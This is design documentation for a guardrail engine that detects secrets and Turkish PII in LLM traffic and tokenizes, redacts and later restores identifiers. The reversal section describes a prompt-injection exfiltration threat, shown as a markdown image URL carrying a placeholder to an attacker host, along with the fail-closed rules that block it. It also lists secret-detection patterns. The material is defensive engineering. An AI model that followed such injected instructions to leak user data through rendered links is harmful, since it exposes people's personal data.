# Guardrails and PII (FFCore Guard, package 08-lite)

FFCore Guard scans every text that goes to the model or comes back from it, and every tool call,
against a project's policy. It can block, rewrite (redact, mask, tokenize), warn or only log.
There is no guardrail hook inside LiteLLM: the backend is the single control point (06a runtime,
06b facade).

08-lite delivers the engine, regex PII recognizers, secrets and tool-argument rules, the policy
API, a test panel and an internal evaluation endpoint. Turkish NER (person, organization,
location), the prompt-injection classifier, the streaming buffer and egress calibration arrive
with the full package (08).

## Stages (CONTRACTS C4, frozen when 08 merges)

| Stage | When |
|---|---|
| `prompt.pre` | once per user turn |
| `input.pre` | before every model call |
| `output.pre` | before the answer reaches the caller |
| `output.stream.delta` | during streaming (no rule type runs here yet; refused as a rule stage) |
| `tool.pre` | tool name and arguments, before the call |
| `tool.post` | tool result, before it goes back to the model |
| `egress` | the final packet sent to the model provider (llmaas) |

`egress` runs only when `GUARDRAIL_EGRESS_ENABLED=true` (llmaas installations). With `false`
(airgap) an egress evaluation is an explicit error (`409 egress_stage_disabled`), never a silent
pass.

## Decision (CONTRACTS C4)

`evaluate(text, stage, policy, *, ctx) -> Decision(action, text_out, events, message,
reference_id)`

- `action`: `allow` or one of the `action_taken` values `block`, `redact`, `mask`, `tokenize`,
  `warn`, `log`. The strongest action of the chain wins
  (`block` > `redact`/`mask`/`tokenize` > `warn` > `log` > `allow`).
- `text_out`: the rewritten text; empty on `block`.
- `message`: on `block`, the policy's `block_message` in the caller's locale (`en`, `tr`), English
  when the locale has no text.
- `reference_id`: on `block`, the id shown to the user and stored with the events.
- `events`: one per evaluated rule (see "Events").

The internal endpoint returns the same shape (`DecisionOut` in `backend/openapi/08.yaml`).

## Policies

Two entities, both per project:

- **PII policy** (`pii_policies`): engine (`regex`, or `ner`: the regex recognizers plus the
  Turkish NER model for `PERSON`, `ORGANIZATION`, `LOCATION`), default action, languages,
  minimum confidence, context boost, categories (each with enabled, severity, action, language)
  and custom patterns.
- **Guardrail policy** (`guardrail_policies`): an ordered rule chain, mode, `short_circuit`,
  `on_error` and the block message.

### Rule types

| Type | Finds | Action |
|---|---|---|
| `pii` | categories enabled in the referenced PII policy (`pii_policy_key`) | the rule's action; without one, each category's action, else the PII policy's default action |
| `secrets` | vendor keys (`sk-`, AWS, GitHub, Slack), JSON web tokens, private key blocks, connection strings with a password, values after a password keyword, high-entropy tokens (≥ 24 characters, ≥ 3.5 bits per character; UUIDs excluded, and names made of plain words and numbers such as `SZL-2025-003_temizlik-hizmet`: every `-`/`_` segment is digits, a word (case-normalized: at least 30 % vowels, no run of 3 consonants), a short tag (`v2`, `q3`, `kdv`) or an upper-case code of 2-6 letters directly before a number (`PRSIM-1234`); one other segment, or more than 15 tag and code letters in three or more segments, keeps the value under the check), hex strings of 32+ characters with letters and digits; tokens of 13-23 characters only when a credential word names them (`API_KEY=`, `Authorization: Bearer`, `token:`, `client_secret=`, `the secret is`, `erişim anahtarı:`), with the same exemptions (see "Short tokens") | required |
| `tool_args` | regex `patterns` in the arguments of `tools` (`<tool_key>.<action>`, wildcards allowed); `args` limits the search to named arguments of a JSON object | `block`, `warn` or `log`; only at `tool.pre` |

`injection`, `topic`, `output_format` and `banned_words` are refused with
`422 rule_type_unsupported` until they are delivered. A category without a recognizer can only
be enabled together with a custom pattern; otherwise `422 category_unsupported`. `PERSON`,
`ORGANIZATION` and `LOCATION` are recognized by a PII policy with `engine: ner` (see "Turkish
NER"); with `engine: regex` they still need a custom pattern. Nothing that looks enabled is
silently ignored.

### Turkish NER (08 full 1b)

`engine: ner` runs the regex recognizers and a Hugging Face token-classification model
(`NER_MODEL` at `NER_REVISION`, CPU) for person, organization and location names. A name never
overrides a regex or custom finding: an overlapping NER span is cut to the parts outside it (and
outside any `<<PII_n>>` placeholder already in the text), so checksummed values keep their
category and a name glued to one is still masked. The evidence is `ner <model>@<revision> score 0.97`. `engine: regex` never
calls the model.

- The model is loaded only by the API process (like the embedding model). The agent worker and
  the ingest (worker and `ingest-raw`) ask `POST /api/v1/internal/guardrails/ner` (service
  account; spans, category, score and evidence, never the value).
- Fail-loud: without `NER_MODEL`/`NER_REVISION` a NER policy is `ner_not_configured` (a
  configuration error, not `on_error`); a missing weight is `model_missing` (offline cache only,
  `make models`); a model label that maps to no category is `ner_label_unknown` at load. When NER
  cannot answer at egress, an enforce rule fails loudly with `ner_unavailable` whatever
  `on_error` says (the identifiers must not leave unmasked because NER is down): 503 `api_error`
  on the direct model path, the external agent and the internal evaluate endpoint, 502
  `api_error` (the run's code) inside a facade agent run (see the API reference). In the text
  stages the rule fails and follows `on_error` (default `block`). Nothing falls back to regex
  only.
- Long texts are read in overlapping windows (stride 128 tokens), never cut at the model limit.
  The internal endpoint takes at most 200,000 characters per request; a worker sends a longer
  text (a large document at ingest) in windows overlapping by 2,000 characters and merges the
  spans the overlap repeats, so a name on a window edge is still found.
- Weights: `make models` downloads the candidates (model card, config, tokenizer, PyTorch
  weights only) into the `model_cache` volume; `make models-check` lists them offline. The
  measured model, its licence and the quality and latency table are added when the measurement
  has run (package 08 full 1b; until then the choice is open).

### Short tokens (FOLLOWUP-106)

Below 24 characters entropy does not separate a key from a code or a name, so a short token is a finding only when a credential word stands right before it (`api_key`, `access_key`, `client_secret`, `secret_key`, `secret`, `token`, `authorization`, `bearer`, and `anahtar` only as `erişim/erisim/API/gizli anahtar(ı/i)`, since "anahtar teslim" is an idiom; then an optional `:`/`=`/`is`, quotes and `Bearer`/`Basic`). Digits only, a single word, plain identifiers (as above), camelCase/PascalCase names of whole humps (`getAccessToken`, `BearerTokenRequired`) and ticket ids (2-6 capital letters then 6+ digits, `INC0012345678`) stay exempt. The patterns are linear in the input (one way to match whitespace; 200,000 spaces after a credential word finish well under a second). Measured with random values in nine credential phrasings (seed 106, 2,000 per shape; `tests/unit/test_08t_secrets_short.py`):

| Shape (13-23 characters) | With a credential word | Same values without one |
|---|---|---|
| upper case 2x6 (`ABCDEF_GHIJKL`) | 95.2 % | 0 / 200 |
| upper case 3x6 | 99.0 % | 0 / 200 |
| upper case 16 | 99.1 % | 0 / 200 |
| mixed case and digits 14 | 99.95 % | 0 / 200 |
| upper case and digits 20 | 100 % | 0 / 200 |

Upper case 2x6 stays near 95 %: about one random pair of six letters in twenty reads as two words and keeps the plain-identifier exemption, which document names and codes need. Without a credential word nothing changed (08 r3: 0 % for these shapes).

### Egress per source (FOLLOWUP-107)

In an agent run every retrieved chunk goes through `egress` on its own before it is put into the model's input (`always` retrieval and `search_documents` results alike). A block on one chunk leaves that chunk out and lists it under `blocked` in the `sources` event (public fields, `reason`, `reference_id`; never the text); the run fails `guardrail_block` only when every chunk is blocked. The question, history and tool results still pass `egress` as a whole message (BLOCKERS 134): a secret there fails the run as before.

### Chain, modes and errors

- Rules bound to the stage run in order; each rule's output is the next rule's input (a redacted
  value is not seen again).
- `block` ends the chain. With `short_circuit=false` the remaining rules still run so the record
  is complete; the decision stays `block`.
- `mode`: `off` evaluates nothing; `monitor` evaluates and records everything and applies nothing
  (measure on real traffic first); `enforce` applies. A new policy starts in `monitor`; switching
  to `enforce` is an audited update (before and after state). A rule may set its own `mode`
  (`monitor` or `enforce`); without one it follows the policy. Only enforce-mode rules change
  the text or block; a monitor-mode rule only records.
- `on_error`: a rule that fails (`block`, the default, is fail-closed) blocks the text; `allow`
  lets it through and records the failure.
- Text longer than 200,000 characters is refused (`422 text_too_long`), never cut.

### Built-in default policy

A project without a stored policy keyed `default` uses the built-in one (version 3, shown in the
API with `builtin: true`):

| Rule | Stages | Action | Mode |
|---|---|---|---|
| `secrets` | all text stages and `egress` | `block` | policy (`monitor`) |
| `pii` (built-in PII policy) | `prompt.pre`, `input.pre`, `output.pre`, `tool.pre`, `tool.post` | `redact` | policy (`monitor`) |
| `pii` (built-in egress PII policy `default-egress`) | `egress` | `tokenize` | `enforce` |

The policy is `monitor`: it blocks and redacts nothing until an administrator stores an
enforce policy. The egress rule is enforced regardless: with `GUARDRAIL_EGRESS_ENABLED=true`
(llmaas) identifiers leave for an external provider only as placeholders, also in a project
that set no policy. Version 1 kept the egress rule in monitor, so the provider received raw
identifiers (plan/18 F4). The built-in PII policy enables the
five regex categories that are on by default in the brief: `TR_NATIONAL_ID`, `TR_PHONE`,
`TR_IBAN`, `EMAIL_ADDRESS`, `CREDIT_CARD`. `CVV` and `PIN` are on by default in the brief but
need context-aware recognition; they arrive with 08 full. Storing a policy with key `default`
replaces the built-in one.

Version 3 (08 full 1b): the egress rule reads its own PII policy, `default-egress`, resolved in
this order:

1. A stored PII policy keyed `default-egress` is used as it is.
2. Otherwise, a stored PII policy keyed `default` (which fed egress in version 2): its categories
   and custom patterns, with `PERSON` and `engine: ner` added when `GUARDRAIL_EGRESS_NER=true`.
3. Otherwise the built-in one: the five regex categories, plus `PERSON` (`engine: ner`) when
   `GUARDRAIL_EGRESS_NER=true`.

With `true`, person names leave for the provider as placeholders too; with `false`, egress masks
what version 2 masked. The text stages keep `default` and never call NER. The PII policy list
shows `default-egress` as built-in (`builtin: true`, as resolved above) until one is stored, and a
stored chain may reference it: the built-in chain can be stored as it is shown.

## Masking

| Action | Result |
|---|---|
| `redact` | `[TR_NATIONAL_ID]` (the category code) |
| `mask` | at most the last four characters and never more than half stay visible: `*******0146`, CVV `**8`, a one-digit value `*`; e-mail keeps the first letter (none if the local part has one letter) and the domain: `a***@ornek.com`, `*@example.org`. A masked value never equals the raw one |
| `tokenize` | `<<PII_1>>`; exactly the same value gets the same placeholder within a run (no normalisation: `a.b@x` and `ab@x` are different; the same number written differently gets a separate placeholder, never a wrong one). The mapping lives in Redis for the run (`PII_TOKEN_TTL_S`, renewed on use) and is created in one atomic Redis script, so no caller sees a placeholder whose reverse entry is missing. Numbers come from a counter per scope that lives 400 days (longer than any stored copy), so a number is never issued twice in a scope, even after its mapping expired; a scope's counter first passes every placeholder number up to 1,000,000 the request or the conversation carries in. A scope issues at most 9,999,999. A placeholder has 1-7 ASCII digits: a longer `<<PII_n>>` or one with non-ASCII digits is no placeholder (never carried, reserved or reversed). A carried placeholder above 1,000,000 is ignored, not reserved (KARARLAR (h′)): a conversation that has one keeps working and later values get ordinary numbers; no real scope reaches that number, so nothing collides. A scope that would issue past 9,999,999 (it has already issued 9,999,999 values) fails loudly with `placeholder_out_of_range`, whatever the policy's `on_error` says; the internal evaluate endpoint answers it with 400. It is reversed on output; a placeholder the run never issued is reported, not guessed |

Tokenize needs a run id (`run_id` in the internal request); without one the rule fails and
follows `on_error`.

### Reversal at the exit (C17)

Placeholders are reversed only where text leaves the backend: the console run stream (live and replay) for the run's own user, the facade's agent path, direct model path (one piece and live stream) and external agent path for the caller. A live stream never splits a placeholder: on the agent path the writer holds a delta's tail that may still open one (`PlaceholderAligner`, at most 15 characters) so every stored stream entry has whole placeholders; on the direct path each choice's content and tool call arguments pass a `StreamDetokenizer`. Nothing is reversed when the policy enforces a `pii` rule on `output.pre`/`output.stream.delta` (the output was checked with the placeholders in it; the kept placeholders are logged as `detokenize_skipped_policy scope=<run or request> count=<n>`, no value), and nothing stored is reversed. Unresolved placeholders stay and are logged (`detokenize_unresolved scope=<run or request> count=<n>`).

Who sees what (C17):

| Who | Sees |
|---|---|
| The provider and an external agent (llmaas) | placeholders (egress tokenizes) |
| The run's own user on the console (live stream, replay) | values |
| The caller of a facade request (direct model, agent, external agent) | values |
| Another member reading the run (analyst, admin, approver) | placeholders |
| Stored views (`GET /runs/{id}`, `GET /runs/{id}/events`, approvals) | placeholders |
| A placeholder after the first HTML tag in the reader's stream (also `<br>`, `List<String>`), or on a URL line (a URL scheme such as `http:`, or `](`, `]:`, `//`, `url(`, `src=`, `href=`, `srcset=`, `action=`, `poster=`, `background=`, `style=`, `data=`), for every reader | placeholder (`detokenize_skipped_url`, count only) |
| Any reader when the policy enforces a `pii` rule on the output | placeholders (`detokenize_skipped_policy`, count only) |

Placeholders stay where an upstream (external agent, provider, or an instruction injected through a document or tool result) could make a client that renders the answer send a value to its host, e.g. `![x](https://its-host/?q=<<PII_1>>)` or an HTML tag that loads a URL (KARARLAR "C17 geri çevirme bağlam istisnası", "C17 URL bağlam kuralı satır düzeyinde ve fail-closed" with its addendum, "C17 geri çevirme: cevap düzeyinde HTML fail-closed"). Two rules, neither of which tries to follow HTML:

- **HTML, for the rest of the reader's stream.** After the first HTML tag (`<` and a letter; the only exception is `<PII_n>>` followed by `>>`, whatever comes before it, so `<PII_1 style` is a tag) no placeholder of the rest of that text or stream is reversed. On the console and the facade agent the rule is per reader of a run, not per model turn: it is not reset between turns, and a reader that continues after an approval replays the earlier entries first, so a tag in the first turn also keeps the values of the final answer. Earlier rounds followed tags, quotes and attribute values line by line and each round found a respelling (a stray quote, a `<pre>` or `<style>` block, CSS and entity escapes); a fail-closed rule does not rely on such distinctions.
- **Markdown and URLs, per line.** No placeholder is reversed on a line with a URL scheme and its colon (`http:`, `https:`, `ftp:`, `data:`, `javascript:`, `blob:`, `file:`) or a marker (`](`, `]:`, `//`, `url(`, `src=`, `href=`, `srcset=`, `action=`, `poster=`, `background=`, `style=`, `data=`): `]( //host`, a reference definition `[1]: //host`, an angle target `](<./a b>)`. A markdown target left open at the end of its line (a destination, an angle target, `]:` with its value on the next line) keeps the next line under the rule until it closes or a blank line ends it (CommonMark does not let one cross a blank line).

A stream scans each new piece with a short overlap and keeps at most 8,192 characters of its current line; a longer line keeps its placeholders, and when a marked or open line is cut that way the rest of the stream keeps them. A CR that ends a stream piece does not end the line (half a CRLF). A reader that starts after an entry (`Last-Event-ID`, `after`, the console after an approval) rebuilds this state from the stored live token entries up to it; when it cannot (the entry is gone, Redis fails, any other error) the rest of the stream keeps its placeholders. When the live stream has expired, a reader that starts after an entry gets the stored rows and keeps all their placeholders, since there is no live entry to rebuild from. On a stream, a placeholder already sent before the line's marker or the answer's first tag arrived is not taken back (it is not in a target: every target starts after its marker); a text in one piece keeps every placeholder of the line.

The trade-off (accepted, fail-closed; KARARLAR "C17 HTML kuralı, düzeltmeler" (i)): a value reaches the reader as a placeholder on a line with a link or a marker, also where the marker is plain prose (`Personal data: <<PII_1>>`, `Attached file: …` read as the schemes `data:` and `file:`, a code comment with `//`), and anywhere after the first `<` and a letter, which model answers write often without meaning HTML: a `<br>` in a table cell, `List<String>`, `#include <stdio.h>`, `Bearer <token>`, `<your-email>`, `x<y`. The cost falls on every reader, the owner on the FFCore console too: the console shows answers as plain text, so there it hides values without guarding against a leak, but it has no exemption, because a console that renders markdown later would otherwise be open without notice. Only the leak risk is limited to clients that render raw HTML or markdown. Tool call arguments get the values JSON-escaped.

If the token store cannot be read at the exit, the answer ends with a coded error and does not show placeholders silently. The console stream sends an `error` event `detokenize_unavailable` with the id of the last entry the reader got (the run goes on; reconnect with that Last-Event-ID to get the failed entry again). The facade (agent, direct model, external agent) answers 502 `api_error` `detokenize_unavailable`; once a stream has started it is `data: {"error": {..., "code": "detokenize_unavailable"}}` without an id, then `data: [DONE]` (on the direct live stream what the reveal held goes out first, unreversed). A facade agent run goes on and is followed again with `X-Resume-Run-Id`, which starts after the run's last approval or question event (or from the start).

## PII categories (canonical list)

English, Presidio-compatible codes; the 13a set uses the same list (a test keeps them equal).

| Code | Meaning | Recognizer in 08-lite | On in the built-in default |
|---|---|---|---|
| `TR_NATIONAL_ID` | Turkish national ID (TC, checksum) | regex | yes |
| `TR_PHONE` | Turkish phone number | regex | yes |
| `TR_IBAN` | Turkish IBAN (mod-97) | regex | yes |
| `TR_TAX_ID` | Turkish tax number (VKN) | custom pattern | no |
| `TR_PLATE` | licence plate | custom pattern | no |
| `TR_PASSPORT` | passport number | custom pattern | no |
| `TR_ADDRESS` | address | custom pattern | no |
| `PERSON` | person name | NER (`engine: ner`) | no; at egress with `GUARDRAIL_EGRESS_NER=true` |
| `ORGANIZATION` | organization name | NER (`engine: ner`) | no |
| `LOCATION` | location | NER (`engine: ner`) | no |
| `EMAIL_ADDRESS` | e-mail address | regex | yes |
| `CREDIT_CARD` | card number (Luhn) | regex | yes |
| `CVV` | card security code | 08 full | no |
| `PIN` | PIN | 08 full | no |
| `GPS` | coordinates | custom pattern | no |
| `MAC_ADDRESS` | MAC address | custom pattern | no |
| `API_TOKEN` | API token | `secrets` rule | no |
| `PASSWORD` | password | `secrets` rule | no |
| `DATE_OF_BIRTH` | date of birth | custom pattern | no |

Every finding carries evidence, for example `checksum valid · context word 'kimlik'`. A context
word in the 30 characters before a hit raises its score by 0.1 (`context_boost`).

## Events

`guardrail_events` gets one row per evaluated rule from the internal endpoint: policy, stage,
rule (`<type>#<index>`), `action_taken`, `status` (`passed`, `redacted`, `failed`), mode,
source, run, reference id, latency, severity, error type, findings (category, score, severity,
evidence, action) and matches (offsets and `masked_value`). `input_preview` is the first 60
characters with every regex PII value, every secret and every value found by any rule of the
chain redacted, whatever the mode and the rule order. Raw values are never stored. The test panel stores
nothing.

## API

The contract is `backend/openapi/08.yaml`
(`python -m ffcore.api.openapi_export 08 > openapi/08.yaml`).

| Endpoint | Who |
|---|---|
| `GET/POST /api/v1/projects/{project_id}/pii-policies`, `GET/PATCH/DELETE .../{policy_id}` | read: analyst; write: admin with edit access |
| `GET/POST /api/v1/projects/{project_id}/guardrail-policies`, `GET/PATCH/DELETE .../{policy_id}` | same |
| `POST /api/v1/projects/{project_id}/guardrails/test` | analyst, also with read access (dry run) |
| `POST /api/v1/internal/guardrails/evaluate` | the internal service account (`SERVICE_TOKEN`) only |
| `POST /api/v1/internal/guardrails/ner` | the internal service account only (workers' NER; 503 `ner_not_configured` / `model_missing`) |

The test panel runs a PII policy with an action (`detect`, `redact`, `mask`, `tokenize`) or a
guardrail policy as if it were enforced, and returns the output text and the findings with
evidence, offsets and masked values. A PII policy still referenced by a guardrail policy cannot be
deleted (`409 pii_policy_in_use`).

## Configuration

| Variable | Meaning |
|---|---|
| `GUARDRAIL_EGRESS_ENABLED` | mandatory; `true` for llmaas, `false` for airgap |
| `GUARDRAIL_EGRESS_NER` | mandatory, no default (08 full 1b): `true` masks person names at egress (llmaas production); `false` only for test stacks and airgap. `false` in llmaas production is a change-control [C] decision |
| `NER_MODEL`, `NER_REVISION` | the NER model (Hugging Face repository and commit); required when `GUARDRAIL_EGRESS_NER=true` and egress is on, otherwise the API and the agent worker do not start; the API also checks at start-up that the weights are in the offline cache (`model_missing`, presence only) |
| `PII_TOKEN_TTL_S` | tokenize mapping lifetime in seconds (default 1800) |
| `REDIS_URL` | the compose Redis (already set) |

### Before deploying 08 full 1b (mandatory variable)

`GUARDRAIL_EGRESS_NER` has no default: an installation's `.env` must set it before this version
starts, otherwise Compose stops with `GUARDRAIL_EGRESS_NER is not set`. Existing installations:
- llmaas production: `true`, with `NER_MODEL`/`NER_REVISION` and the weights from `make models`
  (without the names the API and the agent worker stop at start-up with `ner_not_configured`;
  without the weights in the offline cache the API stops at start-up with `model_missing`).
- airgap: `false` (egress is off, no NER call).
- the PayCore M3 server (llmaas, egress on): the value follows DECISION-166, a user decision
  that is still open; `false` there is a change-control [C] decision (KARARLAR). `m3_preflight`
  checks that the variable is set.

## Latency

Regex path (all five recognizers), 1,000 characters, 200 runs in the tools container:
**P95 0.61 ms** (`python -m ffcore.guardrails.quality`). The brief budget of P95 < 300 ms covers
local rules, NER and the injection model together; NER and injection are measured with 08 full.

Whole evaluation on the real path (built-in policy, `input.pre`: `secrets` + `pii` rules, event
previews included), one CPU and 512 MB (`docker run --cpus=1 --memory=512m`), single runs:

| Input | Characters | Time |
|---|---|---|
| the same e-mail repeated 640 times | 10,240 | 0.036 s |
| the same e-mail repeated 10,000 times | 160,000 | 0.418 s |
| mixed text with all five regex categories (the 200,000 limit) | 200,000 | 0.198 s |

`test_08_cost.py` keeps upper bounds on these (0.5 s, 1 s, 1 s); a run over the bound fails.
Rule scanning and previews run in a worker thread (`asyncio.to_thread`), so they do not hold the
event loop, and each event's `latency_ms` includes its preview. Previews read only the first
4,096 characters (and show at most the first 3,840), search each distinct value once and merge
overlaps in one sorted pass; the findings themselves always cover the whole text.

## PII quality report (regex recognizers)

Measured on the synthetic 13a set `data/samples/pii/pii-100.jsonl` (100 sentences, 10 negatives).
A prediction counts when it overlaps a gold span of the same category. Regenerate with
`docker compose run --rm tools sh -c "cd backend && python -m ffcore.guardrails.quality ../data/samples/pii/pii-100.jsonl"`;
a test keeps this table equal to the measurement.

| Category | Support | Predicted | Recall | Precision |
|---|---|---|---|---|
| `TR_NATIONAL_ID` | 9 | 9 | 1.00 | 1.00 |
| `TR_PHONE` | 9 | 9 | 1.00 | 1.00 |
| `TR_IBAN` | 6 | 6 | 1.00 | 1.00 |
| `EMAIL_ADDRESS` | 8 | 8 | 1.00 | 1.00 |
| `CREDIT_CARD` | 5 | 5 | 1.00 | 1.00 |

Limits of this measurement:

- Support is small (9 national IDs, 9 phones): one miss drops recall to 0.89. The acceptance
  threshold (national ID and phone recall ≥ 0.98, brief 08) is met only with 9 of 9; the llmaas
  threshold (0.99) the same way.
- The set and the recognizers were written by the same team; the formats in the set are known.
  Treat 1.00 as "no regression on the known formats", not as a field recall.
- `PERSON`, `ORGANIZATION` and `LOCATION` need the Turkish NER model (08 full); they are not
  measured here.
